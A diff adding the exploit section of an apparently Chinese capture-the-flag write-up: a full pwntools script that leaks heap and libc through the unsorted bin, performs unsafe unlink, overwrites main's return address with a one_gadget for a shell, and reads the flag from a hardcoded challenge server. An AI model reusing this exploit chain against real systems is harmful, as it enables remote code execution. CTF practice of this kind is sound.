@@ -65,3 +65,173 @@
    向菜单发送 `Q` (Quit) 指令退出主循环，触发 `main` 函数返回，直接跳入 `one_gadget` 弹回 Shell，最后执行 `cat /flag*` 拿到 Flag。
 
 ### 3.EXP
+```python
+#!/usr/bin/env python3
+import re
+import sys
+from pathlib import Path
+
+from pwn import *
+
+BINARY = "./combination_final"
+LIBC = "./libc-2.23.so"
+LD = "./ld-2.23.so"
+
+SERVER_IP = "39.96.193.120"
+SERVER_PORT = 10003
+
+context.binary = elf = ELF(BINARY, checksec=False)
+libc = ELF(LIBC, checksec=False)
+context.log_level = "info"
+
+TINYPAD_GLOBAL = elf.sym["tinypad"]
+SLOT1_CONTENT_PTR = TINYPAD_GLOBAL + 0x108
+
+MAIN_ARENA_OFFSET = libc.sym["__malloc_hook"] + 0x10
+UNSORTED_BIAS = 0x58
+
+OG_CANDIDATE = 0xF1247
+RET_OFFSET_FROM_ENVIRON = 0xF0
+OG_CONSTRAINT_ARGV = 0x78
+
+def create_connection():
+    if args.REMOTE:
+        return remote(args.HOST or SERVER_IP, int(args.PORT or SERVER_PORT))
+    ld_path = Path(LD)
+    if ld_path.exists():
+        return process([str(ld_path), "--library-path", ".", BINARY])
+    return process(BINARY)
+
+def prompt_for(p: tube, expected: bytes) -> None:
+    p.recvuntil(expected)
+
+def send_cmd(p: tube, letter: bytes) -> None:
+    prompt_for(p, b"[*] COMMAND >> ")
+    p.sendline(letter)
+
+def store_entry(p: tube, sz: int, payload: bytes) -> None:
+    send_cmd(p, b"A")
+    prompt_for(p, b"[*] MEM_SIZE >> ")
+    p.sendline(str(sz).encode())
+    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")
+
+def remove_entry(p: tube, idx: int) -> None:
+    send_cmd(p, b"D")
+    prompt_for(p, b"[*] INDEX_ID >> ")
+    p.sendline(str(idx).encode())
+
+def modify_entry(p: tube, idx: int, payload: bytes) -> None:
+    send_cmd(p, b"E")
+    prompt_for(p, b"[*] INDEX_ID >> ")
+    p.sendline(str(idx).encode())
+    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")
+    prompt_for(p, b"[?] APPLY_CHANGE? (Y/n) >> ")
+    p.sendline(b"Y")
+
+def read_back(p: tube, idx: int) -> bytes:
+    p.recvuntil(b" #   INDEX: %d\n # CONTENT: " % idx)
+    return p.recvuntil(b"\n+------------------------------------------------------------------------------+", drop=True)
+
+def extract_ptr(raw: bytes) -> int:
+    return u64(raw.rstrip(b"\n")[:6].ljust(8, b"\x00"))
+
+def pack_words(*vals: int) -> bytes:
+    return b"".join(p64(v) for v in vals)
+
+def phase_heap_leak(p: tube):
+    """Alloc 4 chunks, free two to leak heap and libc via unsorted bin."""
+    for marker in [b"A", b"B", b"C", b"D"]:
+        store_entry(p, 0x80, marker * 8)
+
+    remove_entry(p, 3)
+    remove_entry(p, 1)
+
+    heap_raw = extract_ptr(read_back(p, 1))
+    heap_base = heap_raw - 0x120
+
+    arena_raw = extract_ptr(read_back(p, 3))
+    main_arena_addr = arena_raw - UNSORTED_BIAS
+    libc.address = main_arena_addr - MAIN_ARENA_OFFSET
+
+    log.info("heap_base   = %#x", heap_base)
+    log.info("main_arena  = %#x", main_arena_addr)
+    log.info("libc_base   = %#x", libc.address)
+
+    remove_entry(p, 2)
+    remove_entry(p, 4)
+
+    return heap_base, main_arena_addr
+
+def phase_unsafe_unlink(p: tube, heap_base: int, arena_addr: int):
+    """Craft fake chunk overlapping tinypad globals, trigger unlink corruption."""
+    store_entry(p, 0x18, b"X" * 0x18)
+    store_entry(p, 0x100, b"Y" * 0xF8 + p64(0x11))
+    store_entry(p, 0x100, b"Z" * 0xF8)
+    store_entry(p, 0x100, b"W" * 0xF8)
+
+    victim = TINYPAD_GLOBAL + 0x20
+
+    modify_entry(p, 3, b"W" * 0x20 + pack_words(0, 0x101, victim, victim))
+
+    delta = p64(heap_base + 0x20 - victim).rstrip(b"\x00")
+    nulls_needed = 8 - len(delta)
+    for cut in range(nulls_needed + 1):
+        modify_entry(p, 1, b"A" * 0x10 + delta.rjust(8 - cut, b"F"))
+
+    remove_entry(p, 2)
+
+    modify_entry(p, 4, b"W" * 0x20 + pack_words(0, 0x101, arena_addr + UNSORTED_BIAS, arena_addr + UNSORTED_BIAS))
+
+def phase_stack_overwrite(p: tube):
+    """Install R/W primitive via tinypad metadata corruption, leak stack, write one_gadget to main's return addr."""
+    store_entry(
+        p,
+        0xF0,
+        b"P" * 0xD0 + pack_words(0x80, libc.sym["__environ"], 0x18, SLOT1_CONTENT_PTR),
+    )
+
+    environ_leak = extract_ptr(read_back(p, 1))
+    main_ret_addr = environ_leak - RET_OFFSET_FROM_ENVIRON
+
+    log.info("__environ   = %#x", environ_leak)
+    log.info("main_ret    = %#x", main_ret_addr)
+
+    return main_ret_addr
+
+def arb_write(p: tube, where: int, what: bytes) -> None:
+    modify_entry(p, 2, p64(where)[:6])
+    modify_entry(p, 1, what)
+
+def fire_one_gadget(p: tube, ret_addr: int):
+    gadget_addr = libc.address + OG_CANDIDATE
+
+    constraint_loc = ret_addr + 8 + OG_CONSTRAINT_ARGV
+    arb_write(p, constraint_loc, b"")
+    arb_write(p, ret_addr, p64(gadget_addr)[:6])
+
+    log.info("one_gadget  = %#x", gadget_addr)
+    send_cmd(p, b"Q")
+
+def pull_flag(io: tube) -> str:
+    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; exit")
+    raw = io.recvrepeat(3).decode("latin-1", "replace")
+    m = re.search(r"ISCC\{[^}]+\}", raw)
+    if not m:
+        raise SystemExit("[-] flag not found in shell output")
+    return m.group(0)
+
+def main():
+    io = create_connection()
+
+    heap, arena = phase_heap_leak(io)
+    phase_unsafe_unlink(io, heap, arena)
+    ret = phase_stack_overwrite(io)
+    fire_one_gadget(io, ret)
+
+    flag = pull_flag(io)
+    print(f"[+] FLAG: {flag}")
+
+if __name__ == "__main__":
+    main()
+
+```
